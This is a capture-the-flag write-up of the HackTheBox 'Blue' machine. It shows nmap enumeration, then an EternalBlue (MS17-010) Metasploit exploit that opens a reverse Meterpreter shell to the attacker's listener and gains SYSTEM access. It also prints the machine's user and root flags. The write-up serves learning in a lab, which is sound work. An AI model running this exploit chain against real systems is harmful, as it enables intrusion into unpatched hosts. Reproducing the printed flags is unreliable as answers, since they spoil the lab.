---
date: 2022-12-08
title: Blue HTB Write-Up
machine_ip: 10.10.10.40
os: Windows
difficulty: Easy
my_rating: 3
tags:
  - RCE
  - SMB
references: "[[📚CTF Box Writeups]]"
---
## Enumeration

Used to gather usernames, group names, hostnames, network shares and services, IP tables and routing tables, etc.

### Nmap

Provides features like port scanning, network scanning, vulnerability scanning, os detection, service version detection, system bios scanning, etc.

{% code overflow="wrap" lineNumbers="true" %}
```
└─# nmap 10.10.10.40            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 17:48 UTC
Nmap scan report for 10.10.10.40
Host is up (0.084s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.66 seconds

```
{% endcode %}

We see open ports 135, 139, 445 (NetBIOS, SMB) so we can tell the open ports but not what OS version. Now we can refine the nmap command with flags specifying the default script and version number. -sVC shows the ports version and in default script.

{% code overflow="wrap" lineNumbers="true" %}
```
└─# nmap -sVC 10.10.10.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 18:26 UTC
Nmap scan report for 10.10.10.40
Host is up (0.083s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-08T18:27:41
|_  start_date: 2022-12-08T17:46:00
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-08T18:27:39+00:00
|_clock-skew: mean: 2s, deviation: 1s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.57 seconds

```
{% endcode %}

SMB is running Microsoft Windows 7 Pro and is a Workgroup. Host is HARIS-PC, so we should look for the user haris in our flag hunt.

At this point, a walkthrough was referenced.

Now we can run the smb-vuln script flag with nmap for ports 139 and 445. This will display vulnerabilities in the SMB. -p specifies ports and --script= identifies a script to run, in this case the smb-vuln script.

{% code lineNumbers="true" %}
```
└─# nmap --script=*smb-vuln* -p139,445 10.10.10.40
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 18:01 UTC
Nmap scan report for 10.10.10.40
Host is up (0.083s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds
                                                              
```
{% endcode %}

Critical remote code execution vulnerability in Microsoft SMBv1 servers (ms17-010) and the CVE corresponding ID (CVE-2017-0143) is linked as well with other references. Now that we have a vulnerability, we can search for exploits relating to that vulnerability using Searchsploit.

### Searchsploit

Tool used to search for exploits and related data in the exploit database (Exploit-DB). Using shell script to parse through data from the CSV files from the repository.

ms17-010 was identified in the nmap smb-vuln results above. So search for this vulnerabilitiy's exploit using searchsploit.

{% code lineNumbers="true" %}
```
└─# searchsploit ms17-010
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'Eterna | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-0 | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code E | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlu | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Rem | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB  | windows_x86-64/remote/41987.py
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
{% endcode %}

## Exploitation

Take action on the identified vulnerabilities during the enumeration and exploit.

### msfconsole (with Metasploit Framework)

Metasploit Framework is a tool that identifies systematic vulnerabilities on servers and networks. Works with different operating systems and is open-source.

### msf>search & run

The search command in the msfconsole searches the Metasploit framework for exploits to the specified vulnerability.

Searchsploit results were unclear to me so I searched in msfconsole to find the exploit we will use.

Using the exploit EternalBlue identified in the search command results for ms17-010 vulnerability. We set the target host IP (rhost) to the Blue box and set local IP (lhost) to my VM tun0 connection from ifconfig.

{% code lineNumbers="true" %}
```
└─# msfconsole
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                      

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.10.40
rhost => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), see https://github.com/rapid7
                                             /metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenti
                                             cation. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machine
                                             s.
   SMBPass                         no        (Optional) The password for the specified usernam
                                             e
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Targ
                                             et. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only a
                                             ffects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     192.168.52.129   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > 

```
{% endcode %}

Now we can run the exploit for shell access.

{% code lineNumbers="true" %}
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.52.129:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 22 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.
```
{% endcode %}

Failed maybe because my Kali Linux machine was not listening to the set lport of 4444. Connection was hanging at "\[\*] 10.10.10.40:445 - Triggering free of corrupted buffer.", however, eventually it worked.

Now lets run EternalBlue exploit identified in the Searchexploit to gain shell access to the SMB ms17-010 server.

{% code lineNumbers="true" %}
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.40:49162 ) at 2022-12-08 18:50:53 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > shell
Process 600 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\haris\Desktop>whoami
whoami
nt authority\system

```
{% endcode %}

Metasploit EternalBlue exploit ran successfully. Gained shell access to 'nt authority\system'. Learned that 'whoami' Linux command did not work at the current directory so used 'shell' command and then whoami. Now we search for user and root flags.

```
meterpreter > cd Users
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-07-21 06:56:36 +0000  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 05:08:56 +0000  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 07:07:31 +0000  Default
040777/rwxrwxrwx  0     dir   2009-07-14 05:08:56 +0000  Default User
040555/r-xr-xr-x  4096  dir   2011-04-12 07:51:29 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
040777/rwxrwxrwx  8192  dir   2017-07-14 13:45:53 +0000  haris

meterpreter > cd Administrator
meterpreter > ls
Listing: C:\Users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  AppData
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  Application Data
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Contacts
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  Cookies
040555/r-xr-xr-x  0       dir   2017-12-24 02:22:48 +0000  Desktop
040555/r-xr-xr-x  4096    dir   2017-07-21 06:56:40 +0000  Documents
040555/r-xr-xr-x  4096    dir   2022-02-18 15:21:10 +0000  Downloads
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:42 +0000  Favorites
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Links
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  Local Settings
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Music
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  My Documents
100666/rw-rw-rw-  786432  fil   2022-12-08 19:20:35 +0000  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-07-21 06:57:29 +0000  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e
                                                           0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-07-21 06:57:29 +0000  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e
                                                           0bcde3ec}.TMContainer000000000000000000
                                                           01.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-07-21 06:57:29 +0000  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e
                                                           0bcde3ec}.TMContainer000000000000000000
                                                           02.regtrans-ms
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  NetHood
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Pictures
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  PrintHood
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  Recent
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Saved Games
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Searches
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  SendTo
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  Start Menu
040777/rwxrwxrwx  0       dir   2017-07-21 06:56:24 +0000  Templates
040555/r-xr-xr-x  0       dir   2017-07-21 06:56:40 +0000  Videos
100666/rw-rw-rw-  262144  fil   2022-12-08 19:20:35 +0000  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2017-07-21 06:56:24 +0000  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-07-21 06:56:24 +0000  ntuser.ini

meterpreter > cd Desktop
meterpreter > pwd
C:\Users\Administrator\Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 06:56:40 +0000  desktop.ini
100444/r--r--r--  34    fil   2022-12-08 19:20:29 +0000  root.txt
meterpreter > cat root.txt
def3798480f8a4ebe7d0433e9ff80041

meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\Users
meterpreter > cd haris
meterpreter > ls
Listing: C:\Users\haris
=======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  AppData
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  Application Data
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:33 +0000  Contacts
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  Cookies
040555/r-xr-xr-x  0       dir   2017-12-24 02:23:23 +0000  Desktop
040555/r-xr-xr-x  4096    dir   2017-07-15 07:58:33 +0000  Documents
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:33 +0000  Downloads
040555/r-xr-xr-x  4096    dir   2017-07-15 07:58:33 +0000  Favorites
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:33 +0000  Links
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  Local Settings
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:33 +0000  Music
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  My Documents
100666/rw-rw-rw-  524288  fil   2021-01-15 09:41:00 +0000  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-07-14 14:03:15 +0000  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e
                                                           0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-07-14 14:03:15 +0000  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e
                                                           0bcde3ec}.TMContainer000000000000000000
                                                           01.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-07-14 14:03:15 +0000  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e
                                                           0bcde3ec}.TMContainer000000000000000000
                                                           02.regtrans-ms
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  NetHood
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:32 +0000  Pictures
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  PrintHood
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  Recent
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:33 +0000  Saved Games
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:33 +0000  Searches
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  SendTo
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  Start Menu
040777/rwxrwxrwx  0       dir   2017-07-14 13:45:37 +0000  Templates
040555/r-xr-xr-x  0       dir   2017-07-15 07:58:32 +0000  Videos
100666/rw-rw-rw-  262144  fil   2022-02-18 15:02:40 +0000  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2017-07-14 13:45:36 +0000  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-07-14 13:45:37 +0000  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-15 07:58:32 +0000  desktop.ini
100444/r--r--r--  34    fil   2022-12-08 19:20:29 +0000  user.txt

meterpreter > cat user.txt
4c2657367302b77fb8a6ab8f10624673

```

Flags for the User 'haris' and Root identified.
